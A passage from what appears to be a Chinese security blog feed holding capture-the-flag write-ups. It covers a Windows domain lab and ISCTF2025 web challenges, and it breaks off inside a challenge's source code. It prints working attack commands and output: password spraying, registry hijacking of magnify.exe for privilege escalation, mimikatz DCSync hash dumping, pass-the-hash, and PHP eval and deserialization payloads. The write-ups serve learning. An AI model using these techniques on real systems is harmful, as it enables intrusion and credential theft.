class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN-WEB</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.8.18</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]2001:0:348b:fb58:83f:175d:d89d:9280</span></span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]DC01</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.8.15</span></span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN19-CLIENT</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.8.31</span></span><br><span class="line"></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]WIN2016</span></span><br><span class="line"><span class="meta prompt_">   [-&gt;</span><span class="language-bash">]172.22.8.46</span></span><br><span class="line"></span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 172.22.8.15 域控</span><br><span class="line">2. 172.22.8.31 域内机器</span><br><span class="line">3. 172.22.8.18 已拿下</span><br><span class="line">4. 172.22.8.46 域内机器</span><br></pre></td></tr></table></figure><p>同时搭建好隧道开始打内网，拿刚刚的账号密码去进行挨个尝试，利用kali上面的工具</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─<span class="params">#</span> proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!<span class="params">#</span>&#x27;</span><br><span class="line">SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)</span><br><span class="line">SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>LOGON<span class="built_in">_</span>FAILURE </span><br><span class="line">SMB         172.22.8.46     445    WIN2016          [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         172.22.8.15     445    DC01             [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br><span class="line">SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br><span class="line">SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab<span class="keyword">\Aldrich</span>:Ald@rLMWuy7Z!<span class="params">#</span> STATUS<span class="built_in">_</span>PASSWORD<span class="built_in">_</span>EXPIRED </span><br></pre></td></tr></table></figure><p>有些密码过期了，没关系直接改密码即可</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-changepasswd xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!<span class="params">#</span>&#x27;@172.22.8.15 -newpass &#x27;Admin@666&#x27;</span><br></pre></td></tr></table></figure><p>但是只有172.22.8.46这个可以登录</p><p><img src="/../images/achieve/2025/12/image-20251217100612264.png" alt="image-20251217100612264"></p><p>前面提示了镜像劫持，看看注册表权限</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Acl -path &quot;HKLM:<span class="keyword">\SOFTWARE</span><span class="keyword">\Microsoft</span><span class="keyword">\Windows</span> NT<span class="keyword">\CurrentVersion</span><span class="keyword">\Image</span> File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/12/image-20251217100829220.png" alt="image-20251217100829220"></p><p>登录进来的用户都可修改，我们利用放大镜提权</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM<span class="keyword">\SOFTWARE</span><span class="keyword">\Microsoft</span><span class="keyword">\Windows</span> NT<span class="keyword">\CurrentVersion</span><span class="keyword">\Image</span> File Execution Options<span class="keyword">\magnify</span>.exe&quot; /v Debugger /t REG<span class="built_in">_</span>SZ /d &quot;C:<span class="keyword">\windows</span><span class="keyword">\system</span>32<span class="keyword">\cmd</span>.exe&quot;</span><br></pre></td></tr></table></figure><p><code>type &quot;C:\Users\Administrator\flag\flag02.txt&quot;</code>拿到第二个flag</p><p><img src="/../images/achieve/2025/12/image-20251217101034462.png" alt="image-20251217101034462"></p><p>然后我们做横向，先收集这台机器在域中的关系，利用bloodhound这个工具</p><p><img src="/../images/achieve/2025/12/image-20251217101415030.png" alt="image-20251217101415030"></p><p>可以看到这台机器也是一台域控机器，因此我们上传猕猴桃直接抓取hash</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="params">#</span> lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">502     krbtgt  3ffd5b58b4a6328659a606c3ea6f9b63        514</span><br><span class="line">1000    DC01<span class="built_in">$</span>   ca4725b5186b3a6699d56662b7a9b7c2        532480</span><br><span class="line">500     Administrator   2c9d81bdcf3ec8b1def10328a7cc2f08        512</span><br><span class="line">1103    WIN2016<span class="built_in">$</span>        a1fbbb8b692fc8bc39c97e6eee719a23        16781312</span><br><span class="line">1104    WIN19-CLIENT<span class="built_in">$</span>   c043da1da4cd586619bc02ff8940d654        16781312</span><br><span class="line">1105    Aldrich c7c654da31ce51cbeecfef99e637be15        512</span><br></pre></td></tr></table></figure><p>之后我kali的<code>crackmapexec</code>打·哈希传递</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u administrator -H 2c9d81bdcf3ec8b1def10328a7cc2f08 -d xiaorang.lab -x &quot;type Users<span class="keyword">\Administrator</span><span class="keyword">\flag</span><span class="keyword">\flag</span>03.txt&quot;</span><br></pre></td></tr></table></figure><p>域控，拿到第三个flag</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 镜像劫持 </tag>
            
            <tag> CS进程注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF2025</title>
      <link href="/2025/12/09/ISCTF2025/"/>
      <url>/2025/12/09/ISCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="b-by-n0t1ce-b0ard"><a href="#b-by-n0t1ce-b0ard" class="headerlink" title="b@by n0t1ce b0ard"></a>b@by n0t1ce b0ard</h2><p><code>CVE-2024-12233</code>直接上网搜<a href="https://github.com/LamentXU123/cve/blob/main/RCE1.md">cve&#x2F;RCE1.md 在主线 ·LamentXU123&#x2F;cve — cve&#x2F;RCE1.md at main · LamentXU123&#x2F;cve</a>拿来直接打就行</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z\(\)_;]+$/&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;师傅，你想拿flag？&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显就是一个无参数rce，利用<code>get_defined_vars()</code>进行逃逸</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get<span class="built_in">_</span>defined<span class="built_in">_</span>vars())));<span class="built_in">&amp;</span>b=system(&#x27;tac /f*&#x27;);</span><br></pre></td></tr></table></figure><h2 id="来签个到吧"><a href="#来签个到吧" class="headerlink" title="来签个到吧"></a>来签个到吧</h2><p>php的反序列化直接打</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$logfile</span>; <span class="keyword">public</span> <span class="variable">$content</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShitMountant</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$url</span>; <span class="keyword">public</span> <span class="variable">$logger</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">ShitMountant</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;url = <span class="string">&quot;file:///flag&quot;</span>;</span><br><span class="line"><span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line"><span class="comment">// 显式设置一个非空的、合法的 logfile 路径</span></span><br><span class="line"><span class="variable">$logger</span>-&gt;logfile = <span class="string">&quot;/tmp/notehub.log&quot;</span>;</span><br><span class="line"><span class="variable">$logger</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST:shark=blueshark:O:12:&quot;ShitMountant&quot;:2:&#123;s:3:&quot;url&quot;;s:12:&quot;file:///flag&quot;;s:6:&quot;logger&quot;;O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:16:&quot;/tmp/notehub.log&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line">api.php?id=1</span><br></pre></td></tr></table></figure><h2 id="难过的bottle"><a href="#难过的bottle" class="headerlink" title="难过的bottle"></a>难过的bottle</h2><p>给出源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag is in /flag</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1MB</span></span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查内容是否包含黑名单中的关键词（不区分大小写）&quot;&quot;&quot;</span></span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black_word <span class="keyword">in</span> content <span class="keyword">for</span> black_word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">zip_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;安全解压ZIP文件（防止路径遍历攻击）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法文件路径: 路径遍历攻击检测&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            zf.extract(member, extract_dir)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;首页&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ZIP文件查看器&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;📦 ZIP文件查看器&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot; id=&quot;index-page&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8 text-center&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body p-5&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;📤&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2 class=&quot;card-title&quot;&gt;轻松查看ZIP文件内容&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                        &lt;p class=&quot;card-text&quot;&gt;上传ZIP文件并安全地查看其中的内容，无需解压到本地设备&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/upload&quot; class=&quot;btn btn-primary btn-lg px-4 me-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                📁 上传ZIP文件</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;#features&quot; class=&quot;btn btn-outline-secondary btn-lg px-4&quot;&gt;</span></span><br><span class="line"><span class="string">                                ℹ️ 了解更多</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row mt-5&quot; id=&quot;features&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;🛡️&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;安全检测&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;系统会自动检测上传文件，防止路径遍历攻击和恶意内容&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;📄&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;内容预览&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;直接在线查看ZIP文件中的文本内容，无需下载&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span 